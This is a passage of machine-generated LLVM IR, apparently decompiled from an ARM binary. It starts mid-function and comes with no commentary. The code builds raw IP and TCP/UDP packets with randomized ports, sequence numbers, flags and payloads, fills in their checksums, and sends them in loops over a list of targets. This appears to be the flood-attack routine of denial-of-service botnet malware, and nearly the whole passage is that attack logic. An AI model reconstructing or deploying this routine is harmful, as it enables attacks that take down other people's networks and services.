  store i32 %v0_ac54, i32* %v3_ac54, align 4
  %v0_ac58 = load i32, i32* @sl, align 4
  %v1_ac58 = trunc i32 %v0_ac58 to i16
  %v2_ac58 = load i32, i32* @r4, align 4
  %v3_ac58 = add i32 %v2_ac58, 2
  %v4_ac58 = inttoptr i32 %v3_ac58 to i16*
  store i16 %v1_ac58, i16* %v4_ac58, align 2
  %v0_ac5c = load i32, i32* %r3.global-to-local, align 4
  %v1_ac5c = trunc i32 %v0_ac5c to i8
  %v2_ac5c = load i32, i32* @r4, align 4
  %v3_ac5c = add i32 %v2_ac5c, 13
  %v4_ac5c = inttoptr i32 %v3_ac5c to i8*
  store i8 %v1_ac5c, i8* %v4_ac5c, align 1
  %v0_ac60 = load i32, i32* @r4, align 4
  %v1_ac60 = add i32 %v0_ac60, 13
  %v2_ac60 = inttoptr i32 %v1_ac60 to i8*
  %v3_ac60 = load i8, i8* %v2_ac60, align 1
  %v4_ac60 = zext i8 %v3_ac60 to i32
  store i32 %v1_ab54, i32* %r3.global-to-local, align 4
  %v1_ac68 = and i32 %v4_ac60, 247
  %v5_ac6c = or i32 %v1_ac68, %v4_ac6c
  store i32 %v5_ac6c, i32* %r2.global-to-local, align 4
  %v1_ac70 = trunc i32 %v5_ac6c to i8
  store i8 %v1_ac70, i8* %v2_ac60, align 1
  %v0_ac74 = load i32, i32* @r4, align 4
  %v1_ac74 = add i32 %v0_ac74, 13
  %v2_ac74 = inttoptr i32 %v1_ac74 to i8*
  %v3_ac74 = load i8, i8* %v2_ac74, align 1
  %v4_ac74 = zext i8 %v3_ac74 to i32
  store i32 %v1_ab58, i32* %ip.global-to-local, align 4
  %v1_ac7c = and i32 %v4_ac74, 251
  %v5_ac80 = or i32 %v1_ac7c, %v4_ac80
  store i32 %v5_ac80, i32* %r3.global-to-local, align 4
  %v1_ac84 = trunc i32 %v5_ac80 to i8
  store i8 %v1_ac84, i8* %v2_ac74, align 1
  %v0_ac88 = load i32, i32* @r4, align 4
  %v1_ac88 = add i32 %v0_ac88, 13
  %v2_ac88 = inttoptr i32 %v1_ac88 to i8*
  %v3_ac88 = load i8, i8* %v2_ac88, align 1
  %v4_ac88 = zext i8 %v3_ac88 to i32
  store i32 %v1_ab5c, i32* %r0.global-to-local, align 4
  %v1_ac90 = and i32 %v4_ac88, 253
  %v4_ac94 = or i32 %v1_ac90, %v3_ac94
  store i32 %v4_ac94, i32* %r2.global-to-local, align 4
  %v1_ac98 = trunc i32 %v4_ac94 to i8
  store i8 %v1_ac98, i8* %v2_ac88, align 1
  %v0_ac9c = load i32, i32* @r4, align 4
  %v1_ac9c = add i32 %v0_ac9c, 13
  %v2_ac9c = inttoptr i32 %v1_ac9c to i8*
  %v3_ac9c = load i8, i8* %v2_ac9c, align 1
  %v4_ac9c = zext i8 %v3_ac9c to i32
  store i32 %v1_ab60, i32* %r1.global-to-local, align 4
  %v1_aca4 = and i32 %v4_ac9c, 254
  %v2_aca8 = or i32 %v1_aca4, %v1_ab60
  store i32 %v2_aca8, i32* %r3.global-to-local, align 4
  %v1_acac = trunc i32 %v2_aca8 to i8
  store i8 %v1_acac, i8* %v2_ac9c, align 1
  %v0_acb0 = call i32 @rand_next()
  %v1_acb0 = trunc i32 %v0_acb0 to i16
  store i32 %v0_acb0, i32* %r0.global-to-local, align 4
  store i32 %v1_ab64, i32* %r2.global-to-local, align 4
  store i1 %v2_acb8, i1* %cpsr_z.global-to-local, align 1
  %v3_acc4.pre = load i32, i32* @r4, align 4
  br i1 %v2_acb8, label %.thread3, label %bb68

bb68:                                             ; preds = %.thread
  %v2_acbc = add i32 %v3_acc4.pre, 13
  %v3_acbc = inttoptr i32 %v2_acbc to i8*
  %v4_acbc = load i8, i8* %v3_acbc, align 1
  %v5_acbc = zext i8 %v4_acbc to i32
  %v2_acc0 = or i32 %v5_acbc, 8
  store i32 %v2_acc0, i32* @r3, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb68
  %v4_acc4 = add i32 %v3_acc4.pre, 14
  %v5_acc4 = inttoptr i32 %v4_acc4 to i16*
  store i16 %v1_acb0, i16* %v5_acc4, align 2
  store i32 %v6_aa14, i32* %r1.global-to-local, align 4
  %v0_accc = load i32, i32* @r5, align 4
  %v1_accc = add i32 %v0_accc, 40
  store i32 %v1_accc, i32* %r0.global-to-local, align 4
  br i1 %v2_acb8, label %bb70, label %bb69

bb69:                                             ; preds = %.thread3
  %v1_acd0 = load i32, i32* @r3, align 4
  %v2_acd0 = trunc i32 %v1_acd0 to i8
  %v3_acd0 = load i32, i32* @r4, align 4
  %v4_acd0 = add i32 %v3_acd0, 13
  %v5_acd0 = inttoptr i32 %v4_acd0 to i8*
  store i8 %v2_acd0, i8* %v5_acd0, align 1
  br label %bb70

bb70:                                             ; preds = %.thread3, %bb69
  %v2_acd4 = inttoptr i32 %v1_accc to i16*
  %v3_acd4 = call i32 @rand_str(i16* %v2_acd4, i32 %v6_aa14)
  store i32 %v3_acd4, i32* %r0.global-to-local, align 4
  %v3_acd8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_acd8, i32* %r3.global-to-local, align 4
  %v1_acdc = add i32 %v3_acd8, 1
  store i32 %v1_acdc, i32* @r4, align 4
  %v1_ace0 = load i32, i32* @r7, align 4
  %v9_ace0 = icmp eq i32 %v1_acdc, %v1_ace0
  store i1 %v9_ace0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_acdc, i32* %stack_var_-44, align 4
  %v5_ace8 = icmp slt i32 %v1_acdc, %v1_ace0
  br i1 %v5_ace8, label %dec_label_pc_ab84, label %dec_label_pc_acec

dec_label_pc_acec:                                ; preds = %bb70
  store i32 %v6_aa14, i32* %r3.global-to-local, align 4
  %v1_acf0 = add i32 %v6_aa14, 20
  store i32 %v1_acf0, i32* @sb, align 4
  br label %dec_label_pc_acf8

dec_label_pc_acf8:                                ; preds = %dec_label_pc_af3c, %dec_label_pc_acec
  %v0_ad108 = phi i32 [ %v1_ace0, %dec_label_pc_acec ], [ 0, %dec_label_pc_af3c ]
  %stack_var_-140.0 = phi i32 [ %v3_aad4, %dec_label_pc_acec ], [ %v3_af48, %dec_label_pc_af3c ]
  %storemerge = add i32 %v6_aa14, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_acfc = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_acfc, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_acfc, 256
  %v3_ad04 = and i32 %tmp71, 65280
  store i32 %v3_ad04, i32* %r3.global-to-local, align 4
  %v4_ad08 = udiv i32 %v1_acfc, 16777216
  %v5_ad08 = or i32 %v3_ad04, %v4_ad08
  store i32 %v5_ad08, i32* @sl, align 4
  %v3_aea8 = icmp eq i32 %v3_aaac, 65535
  %v2_af0c = icmp eq i32 %v1_aa3c, 0
  %v2_ad48 = icmp eq i32 %v6_aa50, -1
  %v7_ad48 = icmp eq i32 %v6_aa50, -1
  br label %dec_label_pc_ad0c

dec_label_pc_ad0c:                                ; preds = %dec_label_pc_ad0c, %dec_label_pc_ae24, %dec_label_pc_acf8
  %v0_ad10 = phi i32 [ %v0_ad108, %dec_label_pc_acf8 ], [ 0, %dec_label_pc_ae24 ], [ 0, %dec_label_pc_ad0c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ad10 = icmp eq i32 %v0_ad10, 0
  store i1 %v2_ad10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ad10, label %dec_label_pc_ad0c, label %dec_label_pc_ad1c

dec_label_pc_ad1c:                                ; preds = %dec_label_pc_ad0c, %dec_label_pc_ae24
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ad20

dec_label_pc_ad20:                                ; preds = %dec_label_pc_ada0, %dec_label_pc_ad1c
  %v1_ad34 = phi i32 [ %v1_ae14, %dec_label_pc_ada0 ], [ 0, %dec_label_pc_ad1c ]
  %v5_ad24 = mul i32 %v1_ad34, 24
  %v1_ad28 = load i32, i32* @r8, align 4
  %v2_ad28 = add i32 %v1_ad28, %v5_ad24
  store i32 %v2_ad28, i32* %r3.global-to-local, align 4
  store i32 %v2_a880, i32* %ip.global-to-local, align 4
  %v1_ad30 = add i32 %v2_ad28, 20
  %v2_ad30 = inttoptr i32 %v1_ad30 to i8*
  %v3_ad30 = load i8, i8* %v2_ad30, align 1
  %v4_ad30 = zext i8 %v3_ad30 to i32
  store i32 %v4_ad30, i32* %r2.global-to-local, align 4
  %v4_ad34 = mul i32 %v1_ad34, 4
  %v5_ad34 = add i32 %v4_ad34, %v2_a880
  %v6_ad34 = inttoptr i32 %v5_ad34 to i32*
  %v7_ad34 = load i32, i32* %v6_ad34, align 4
  store i32 %v7_ad34, i32* @r5, align 4
  %v7_ad38 = icmp eq i8 %v3_ad30, 31
  store i1 %v7_ad38, i1* %cpsr_z.global-to-local, align 1
  %v1_ad3c = add i32 %v7_ad34, 20
  store i32 %v1_ad3c, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_ad30, 32
  br i1 %tmp77, label %dec_label_pc_ae38, label %dec_label_pc_ad44

dec_label_pc_ad44:                                ; preds = %dec_label_pc_ad20
  store i32 %v6_aa50, i32* %r0.global-to-local, align 4
  store i1 %v7_ad48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad48, label %dec_label_pc_ae98, label %dec_label_pc_ad50

dec_label_pc_ad50:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ad44
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_aea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_aea8, label %dec_label_pc_aeb4, label %dec_label_pc_ad64

dec_label_pc_ad64:                                ; preds = %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge, %dec_label_pc_ad50
  %v1_ad68 = phi i32 [ %v1_ad68.pre, %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge ], [ 65535, %dec_label_pc_ad50 ]
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v9_ad68 = icmp eq i32 %v3_aab0, %v1_ad68
  store i1 %v9_ad68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad68, label %dec_label_pc_aec8, label %dec_label_pc_ad70

dec_label_pc_ad70:                                ; preds = %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge, %dec_label_pc_ad64
  %v1_ad74 = phi i32 [ %v1_ad74.pre, %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge ], [ %v1_ad68, %dec_label_pc_ad64 ]
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v9_ad74 = icmp eq i32 %v3_aab4, %v1_ad74
  store i1 %v9_ad74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad74, label %dec_label_pc_aedc, label %dec_label_pc_ad7c

dec_label_pc_ad7c:                                ; preds = %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge, %dec_label_pc_ad70
  %v1_ad80 = phi i32 [ %v1_ad80.pre, %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge ], [ %v1_ad74, %dec_label_pc_ad70 ]
  store i32 %v6_a950, i32* %ip.global-to-local, align 4
  %v9_ad80 = icmp eq i32 %v6_a950, %v1_ad80
  store i1 %v9_ad80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad80, label %dec_label_pc_aef0, label %dec_label_pc_ad88

dec_label_pc_ad88:                                ; preds = %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge, %dec_label_pc_ad7c
  %v1_ad8c = phi i32 [ %v1_ad8c.pre, %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge ], [ %v1_ad80, %dec_label_pc_ad7c ]
  store i32 %v6_a96c, i32* %r0.global-to-local, align 4
  %v9_ad8c = icmp eq i32 %v6_a96c, %v1_ad8c
  store i1 %v9_ad8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad8c, label %dec_label_pc_af04, label %dec_label_pc_ad94

dec_label_pc_ad94:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ad88
  store i32 %v1_aa3c, i32* %r1.global-to-local, align 4
  store i1 %v2_af0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_af0c, label %dec_label_pc_ada0, label %dec_label_pc_af18

dec_label_pc_ada0:                                ; preds = %dec_label_pc_ad94, %dec_label_pc_af04, %dec_label_pc_af18
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ada4 = load i32, i32* @r5, align 4
  %v3_ada4 = add i32 %v2_ada4, 10
  %v4_ada4 = inttoptr i32 %v3_ada4 to i16*
  store i16 0, i16* %v4_ada4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_adac = load i32, i32* @r5, align 4
  store i32 %v0_adac, i32* @r0, align 4
  %v2_adb0 = call i32 @checksum_generic(i32 %v0_adac, i32 20)
  %v3_adb0 = trunc i32 %v2_adb0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_adb8 = load i32, i32* @r5, align 4
  %v4_adb8 = add i32 %v3_adb8, 10
  %v5_adb8 = inttoptr i32 %v4_adb8 to i16*
  store i16 %v3_adb0, i16* %v5_adb8, align 2
  %v0_adbc = load i32, i32* @r6, align 4
  store i32 %v0_adbc, i32* @r1, align 4
  %v0_adc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_adc0 = trunc i32 %v0_adc0 to i16
  %v3_adc0 = add i32 %v0_adbc, 16
  %v4_adc0 = inttoptr i32 %v3_adc0 to i16*
  store i16 %v1_adc0, i16* %v4_adc0, align 2
  %v0_adc4 = load i32, i32* @sl, align 4
  store i32 %v0_adc4, i32* %r2.global-to-local, align 4
  %v0_adc8 = load i32, i32* @sb, align 4
  store i32 %v0_adc8, i32* %r3.global-to-local, align 4
  %v0_adcc = load i32, i32* @r5, align 4
  store i32 %v0_adcc, i32* %r0.global-to-local, align 4
  %v4_add0 = call i32 @checksum_tcpudp(i32 %v0_adcc, i32 %v0_adbc, i32 %v0_adc4, i32 %v0_adc8)
  %v5_add0 = trunc i32 %v4_add0 to i16
  store i32 %v4_add0, i32* %r0.global-to-local, align 4
  %v3_add4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_add4, i32* %r3.global-to-local, align 4
  %v3_add8 = mul i32 %v3_add4, 32
  store i32 %v3_add8, i32* %lr.global-to-local, align 4
  %v3_addc = load i32, i32* @r6, align 4
  %v4_addc = add i32 %v3_addc, 16
  %v5_addc = inttoptr i32 %v4_addc to i16*
  store i16 %v5_add0, i16* %v5_addc, align 2
  %v0_ade0 = load i32, i32* %lr.global-to-local, align 4
  %v1_ade0 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_ade0, -8
  %v5_ade0 = add i32 %v0_ade0, %tmp78
  store i32 %v5_ade0, i32* %lr.global-to-local, align 4
  %v0_ade4 = load i32, i32* @r6, align 4
  %v1_ade4 = add i32 %v0_ade4, 2
  %v2_ade4 = inttoptr i32 %v1_ade4 to i16*
  %v3_ade4 = load i16, i16* %v2_ade4, align 2
  %v4_ade4 = zext i16 %v3_ade4 to i32
  store i32 %v4_ade4, i32* @r6, align 4
  %v1_ade8 = load i32, i32* @r8, align 4
  %v2_ade8 = add i32 %v1_ade8, %v5_ade0
  store i32 %v2_ade8, i32* @lr, align 4
  %v3_adec = add i32 %v2_ade8, 2
  %v4_adec = inttoptr i32 %v3_adec to i16*
  store i16 %v3_ade4, i16* %v4_adec, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_adf8 = load i32, i32* @r5, align 4
  store i32 %v0_adf8, i32* %r1.global-to-local, align 4
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v0_ae00 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_ae00, i32* %r2.global-to-local, align 4
  %v0_ae04 = load i32, i32* @lr, align 4
  %v6_ae0c = call i32 @__libc_sendto(i32 %v3_aa64, i32 %v0_adf8, i32 %v0_ae00, i32 16384, i32 %v0_ae04, i32 16)
  %v3_ae10 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ae10, i32* %r3.global-to-local, align 4
  %v1_ae14 = add i32 %v3_ae10, 1
  store i32 %v1_ae14, i32* %r0.global-to-local, align 4
  %v1_ae18 = load i32, i32* @r7, align 4
  %v9_ae18 = icmp eq i32 %v1_ae14, %v1_ae18
  store i1 %v9_ae18, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ae14, i32* %stack_var_-44, align 4
  %v5_ae20 = icmp slt i32 %v1_ae14, %v1_ae18
  br i1 %v5_ae20, label %dec_label_pc_ad20, label %dec_label_pc_ae24

dec_label_pc_ae24:                                ; preds = %dec_label_pc_ada0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ae28 = icmp eq i32 %v1_ae18, 0
  store i1 %v2_ae28, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ae28, label %dec_label_pc_ad0c, label %dec_label_pc_ad1c

dec_label_pc_ae38:                                ; preds = %dec_label_pc_ad20
  %v1_ae38 = add i32 %v2_ad28, 16
  %v2_ae38 = inttoptr i32 %v1_ae38 to i32*
  %v3_ae38 = load i32, i32* %v2_ae38, align 4
  %v0_ae3c = call i32 @rand_next()
  store i32 %v0_ae3c, i32* %r0.global-to-local, align 4
  %v3_ae40 = load i32, i32* %stack_var_-44, align 4
  %v5_ae48 = mul i32 %v3_ae40, 24
  %v1_ae4c = and i32 %v3_ae38, 16711680
  store i32 %v1_ae4c, i32* %ip.global-to-local, align 4
  %v3_ae50 = udiv i32 %v3_ae38, 16777216
  %v4_ae54 = udiv i32 %v1_ae4c, 256
  %v5_ae54 = or i32 %v4_ae54, %v3_ae50
  store i32 %v5_ae54, i32* %r2.global-to-local, align 4
  %v1_ae58 = load i32, i32* @r8, align 4
  %v2_ae58 = add i32 %v1_ae58, %v5_ae48
  store i32 %v2_ae58, i32* %r1.global-to-local, align 4
  %v1_ae5c = and i32 %v3_ae38, 65280
  store i32 %v1_ae5c, i32* %r3.global-to-local, align 4
  %v1_ae60 = add i32 %v2_ae58, 20
  %v2_ae60 = inttoptr i32 %v1_ae60 to i8*
  %v3_ae60 = load i8, i8* %v2_ae60, align 1
  %v4_ae60 = zext i8 %v3_ae60 to i32
  store i32 %v4_ae60, i32* %ip.global-to-local, align 4
  %v5_ae68 = call i32 @llvm.bswap.i32(i32 %v3_ae38)
  %v7_ae6c = lshr i32 %v0_ae3c, %v4_ae60
  %v8_ae6c = add i32 %v7_ae6c, %v5_ae68
  store i32 %v8_ae6c, i32* %r2.global-to-local, align 4
  %v1_ae7c = and i32 %v8_ae6c, 65280
  store i32 %v1_ae7c, i32* %r1.global-to-local, align 4
  store i32 %v6_aa50, i32* %r0.global-to-local, align 4
  %v5_ae88 = call i32 @llvm.bswap.i32(i32 %v8_ae6c)
  store i32 %v5_ae88, i32* %r3.global-to-local, align 4
  store i1 %v7_ad48, i1* %cpsr_z.global-to-local, align 1
  %v1_ae90 = load i32, i32* @r5, align 4
  %v2_ae90 = add i32 %v1_ae90, 16
  %v3_ae90 = inttoptr i32 %v2_ae90 to i32*
  store i32 %v5_ae88, i32* %v3_ae90, align 4
  br i1 %v2_ad48, label %dec_label_pc_ae98, label %dec_label_pc_ad50

dec_label_pc_ae98:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ad44
  %v0_ae98 = call i32 @rand_next()
  store i32 %v0_ae98, i32* %r0.global-to-local, align 4
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_aea8, i1* %cpsr_z.global-to-local, align 1
  %v1_aeac = load i32, i32* @r5, align 4
  %v2_aeac = add i32 %v1_aeac, 12
  %v3_aeac = inttoptr i32 %v2_aeac to i32*
  store i32 %v0_ae98, i32* %v3_aeac, align 4
  br i1 %v3_aea8, label %dec_label_pc_aeb4, label %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge

dec_label_pc_ae98.dec_label_pc_ad64_crit_edge:    ; preds = %dec_label_pc_ae98
  %v1_ad68.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad64

dec_label_pc_aeb4:                                ; preds = %dec_label_pc_ae98, %dec_label_pc_ad50
  %v0_aeb4 = call i32 @rand_next()
  %v1_aeb4 = trunc i32 %v0_aeb4 to i16
  store i32 %v0_aeb4, i32* %r0.global-to-local, align 4
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v1_aebc = load i32, i32* @r4, align 4
  %v9_aebc = icmp eq i32 %v3_aab0, %v1_aebc
  store i1 %v9_aebc, i1* %cpsr_z.global-to-local, align 1
  %v3_aec0 = load i32, i32* @r5, align 4
  %v4_aec0 = add i32 %v3_aec0, 4
  %v5_aec0 = inttoptr i32 %v4_aec0 to i16*
  store i16 %v1_aeb4, i16* %v5_aec0, align 2
  br i1 %v9_aebc, label %dec_label_pc_aec8, label %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge

dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge:    ; preds = %dec_label_pc_aeb4
  %v1_ad74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad70

dec_label_pc_aec8:                                ; preds = %dec_label_pc_aeb4, %dec_label_pc_ad64
  %v0_aec8 = call i32 @rand_next()
  %v1_aec8 = trunc i32 %v0_aec8 to i16
  store i32 %v0_aec8, i32* %r0.global-to-local, align 4
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v1_aed0 = load i32, i32* @r4, align 4
  %v9_aed0 = icmp eq i32 %v3_aab4, %v1_aed0
  store i1 %v9_aed0, i1* %cpsr_z.global-to-local, align 1
  %v3_aed4 = load i32, i32* @r5, align 4
  %v4_aed4 = add i32 %v3_aed4, 20
  %v5_aed4 = inttoptr i32 %v4_aed4 to i16*
  store i16 %v1_aec8, i16* %v5_aed4, align 2
  br i1 %v9_aed0, label %dec_label_pc_aedc, label %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge

dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge:    ; preds = %dec_label_pc_aec8
  %v1_ad80.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad7c

dec_label_pc_aedc:                                ; preds = %dec_label_pc_aec8, %dec_label_pc_ad70
  %v0_aedc = call i32 @rand_next()
  %v1_aedc = trunc i32 %v0_aedc to i16
  store i32 %v0_aedc, i32* %r0.global-to-local, align 4
  store i32 %v6_a950, i32* %ip.global-to-local, align 4
  %v1_aee4 = load i32, i32* @r4, align 4
  %v9_aee4 = icmp eq i32 %v6_a950, %v1_aee4
  store i1 %v9_aee4, i1* %cpsr_z.global-to-local, align 1
  %v3_aee8 = load i32, i32* @r6, align 4
  %v4_aee8 = add i32 %v3_aee8, 2
  %v5_aee8 = inttoptr i32 %v4_aee8 to i16*
  store i16 %v1_aedc, i16* %v5_aee8, align 2
  br i1 %v9_aee4, label %dec_label_pc_aef0, label %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge

dec_label_pc_aedc.dec_label_pc_ad88_crit_edge:    ; preds = %dec_label_pc_aedc
  %v1_ad8c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad88

dec_label_pc_aef0:                                ; preds = %dec_label_pc_aedc, %dec_label_pc_ad7c
  %v0_aef0 = call i32 @rand_next()
  %v1_aef4 = load i32, i32* @r6, align 4
  %v2_aef4 = add i32 %v1_aef4, 4
  %v3_aef4 = inttoptr i32 %v2_aef4 to i32*
  store i32 %v0_aef0, i32* %v3_aef4, align 4
  store i32 %v6_a96c, i32* %r0.global-to-local, align 4
  %v1_aefc = load i32, i32* @r4, align 4
  %v9_aefc = icmp eq i32 %v6_a96c, %v1_aefc
  store i1 %v9_aefc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aefc, label %dec_label_pc_af04, label %dec_label_pc_ad94

dec_label_pc_af04:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ad88
  %v0_af04 = call i32 @rand_next()
  store i32 %v0_af04, i32* %r0.global-to-local, align 4
  store i32 %v1_aa3c, i32* %r1.global-to-local, align 4
  store i1 %v2_af0c, i1* %cpsr_z.global-to-local, align 1
  %v1_af10 = load i32, i32* @r6, align 4
  %v2_af10 = add i32 %v1_af10, 8
  %v3_af10 = inttoptr i32 %v2_af10 to i32*
  store i32 %v0_af04, i32* %v3_af10, align 4
  br i1 %v2_af0c, label %dec_label_pc_ada0, label %dec_label_pc_af18

dec_label_pc_af18:                                ; preds = %dec_label_pc_ad94, %dec_label_pc_af04
  %v0_af18 = load i32, i32* @r5, align 4
  %v1_af18 = add i32 %v0_af18, 40
  store i32 %v1_af18, i32* %r0.global-to-local, align 4
  store i32 %v6_aa14, i32* %r1.global-to-local, align 4
  %v2_af20 = inttoptr i32 %v1_af18 to i16*
  %v3_af20 = call i32 @rand_str(i16* %v2_af20, i32 %v6_aa14)
  store i32 %v3_af20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ada0

dec_label_pc_af28:                                ; preds = %dec_label_pc_aa74
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v1_af2c = call i32 @__GI___libc_close(i32 %v3_aa64)
  store i32 %v1_af2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af30

dec_label_pc_af30:                                ; preds = %entry, %dec_label_pc_af28
  %v1_af38 = phi i32 [ %v3_aa64, %entry ], [ %v1_af2c, %dec_label_pc_af28 ]
  store i32 %v18_a864, i32* %sb.global-to-local, align 4
  store i32 %v24_a864, i32* %fp.global-to-local, align 4
  store i32 %v27_a864, i32* %lr.global-to-local, align 4
  ret i32 %v1_af38

dec_label_pc_af3c:                                ; preds = %dec_label_pc_aa9c
  store i32 %v6_aa14, i32* %r0.global-to-local, align 4
  %v1_af44 = add i32 %v6_aa14, 20
  store i32 %v1_af44, i32* @sb, align 4
  %v3_af48 = mul i32 %v6_aa14, 65536
  store i32 %v3_af48, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_acf8

; uselistorder directives
  uselistorder i32 %v0_aedc, { 1, 0 }
  uselistorder i32 %v0_aec8, { 1, 0 }
  uselistorder i32 %v0_aeb4, { 1, 0 }
  uselistorder i32 %v5_ae88, { 1, 0 }
  uselistorder i32 %v3_ae38, { 2, 1, 3, 0 }
  uselistorder i32 %v1_ae14, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ade0, { 1, 0 }
  uselistorder i32 %v4_add0, { 1, 0 }
  uselistorder i1 %v7_ad48, { 2, 1, 0 }
  uselistorder i1 %v2_af0c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_aea8, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_acdc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_acb0, { 1, 0 }
  uselistorder i32 %v1_ab64, { 1, 2, 0 }
  uselistorder i32 %v1_ab60, { 2, 1, 0 }
  uselistorder i32 %v1_ab5c, { 2, 0, 1 }
  uselistorder i32 %v1_ab58, { 2, 0, 1 }
  uselistorder i32 %v1_ab54, { 2, 0, 1 }
  uselistorder i32 %v1_ab2c, { 1, 0 }
  uselistorder i32 %v3_aad4, { 1, 0 }
  uselistorder i32 %v3_aaac, { 0, 1, 3, 2 }
  uselistorder i32 %v0_aaa4, { 1, 0, 2 }
  uselistorder i32 %v0_aaa0, { 1, 0, 2 }
  uselistorder i32 %v0_aa9c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_aa94, { 1, 0 }
  uselistorder i1 %v7_aa68, { 1, 0 }
  uselistorder i32 %v3_aa64, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_aa50, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_aa3c, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_aa14, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_a96c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_a950, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_a900, { 1, 2, 0 }
  uselistorder i32 %v5_a8f4, { 0, 2, 1 }
  uselistorder i32 %v5_a8bc, { 0, 2, 1 }
  uselistorder i32 %v2_a880, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 38, 37, 10, 11, 12, 13, 15, 14, 17, 16, 0 }
